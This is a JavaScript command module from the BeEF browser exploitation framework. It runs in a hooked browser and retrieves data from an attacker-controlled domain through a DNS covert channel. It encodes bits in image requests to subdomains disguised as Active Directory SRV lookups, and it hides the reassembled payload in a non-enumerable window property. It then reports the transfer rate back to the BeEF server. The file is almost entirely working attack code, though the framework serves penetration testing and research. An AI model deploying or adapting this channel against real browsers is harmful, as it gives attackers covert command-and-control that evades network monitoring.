//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
This JavaScript retreives data from a server via DNS covert channel.

A remote controlled domain with a custom DNS server implementing covert channel logic is required.
BeEF supports this feature via Server-to-Client DNS Tunnel extension.

The initial concept of the DNS covert channell and its implementation are described in the following literature:
- K.Born. Browser-Based Covert Data Exfiltration. http://arxiv.org/ftp/arxiv/papers/1004/1004.4357.pdf
- W. Alkorn,C. Frichot, M.Orru. The Browser Hacker's Handbook. ISBN-13: 978-1118662090, ISBN-10: 1118662091  

*/
beef.execute(function() {

  var payload_name  = "<%= @payload_name %>";
  var domain        = "<%= @zone %>";
  var scheme        = beef.net.httpproto;
  var port          = beef.net.port;
  var cid           = "<%= @command_id %>";
  var curl          = "<%= @command_url %>";
 
  var messages = new Array();
  var bits = new Array();
  var bit_transfered = new Array();
  var timing = new Array();
 
  // Do the DNS query by reqeusting an image
  send_query = function(fqdn, msg, byte, bit) {
    var img = new Image;
    var fport = "";
  
    if (port !== "80") fport = ":"+port;

    img.src = scheme+"://" + fqdn + fport + "/tiles/map";  
  
    img.onload = function() { // successful load so bit equals 1
      bits[msg][bit] = 1;
      bit_transfered[msg][byte]++;
      if (bit_transfered[msg][byte] >= 8) reconstruct_byte(msg, byte);
    }

    img.onerror = function() { // unsuccessful load so bit equals 0
      bits[msg][bit] = 0;
      bit_transfered[msg][byte]++;
      if (bit_transfered[msg][byte] >= 8) reconstruct_byte(msg, byte);
    }
  };

	// Construct DNS names based on Active Directory SRV resource records pattern and resolv them via send_query function
	// See http://technet.microsoft.com/en-us/library/cc961719.aspx
  function get_byte(msg, byte) {
    bit_transfered[msg][byte] = 0;
    var rnd8 = getRandomStr(8);
    var rnd12 = getRandomStr(12);
    // Request the byte one bit at a time
    for(var bit=byte*8; bit < (byte*8)+8; bit++){
        // Set the message number (hex)
        msg_str = ("" + msg.toString(16)).substr(-8);
        // Set the bit number (hex)
        bit_str = ("" + bit.toString(16)).substr(-8);
        // Build the subdomain
        subdomain = "_ldap._tcp." + rnd8 + "-" + msg_str + "-" + cid + "-" + bit_str + "-" + rnd12;
        // Build the full domain
        name = subdomain + '.domains._msdcs.'+ domain;
        send_query(name, msg, byte, bit)
        }
  }

  // Construct random sring
  function getRandomStr(n){
    return Math.random().toString(36).slice(2, 2 + Math.max(1, Math.min(n, 12)));
  }

  // Build the environment and request the message
  function get_message(msg) {
    // Set variables for getting a message
    messages[msg] = "";
    bits[msg] = new Array();
    bit_transfered[msg] = new Array();
    timing[msg] = (new Date()).getTime();
    get_byte(msg, 0);
  }

  // Build the data returned from the binary results
  function reconstruct_byte(msg, byte){
    var char = 0;
    // Build the last byte requested
    for(var bit=byte*8; bit < (byte*8)+8; bit++){
        char <<= 1;
        char += bits[msg][bit] ;
    }

    // Message is terminated with a null byte (all failed DNS requests)
    if (char != 0) {
    // The message isn't terminated so get the next byte
        messages[msg] += String.fromCharCode(char);
        get_byte(msg, byte+1);
    }
    else {
      // The message is terminated so finish
      delta = ((new Date()).getTime() - timing[msg])/1000;
      bytes_per_second = "" +
      ((messages[msg].length + 1) * 8)/delta; 

      // Save the message in the Window
      if (window.hasOwnProperty(payload_name))
          window[payload_name] = messages[msg]
      else
          Object.defineProperty(window,payload_name, {  value: messages[msg],
                                                        writable: true,
                                                        enumerable: false });
 
      beef.net.send(curl, parseInt(cid),'s2c_dns_tunnel=true' + '&bps=' + bytes_per_second);

    } 
  }
  get_message(0);  
});
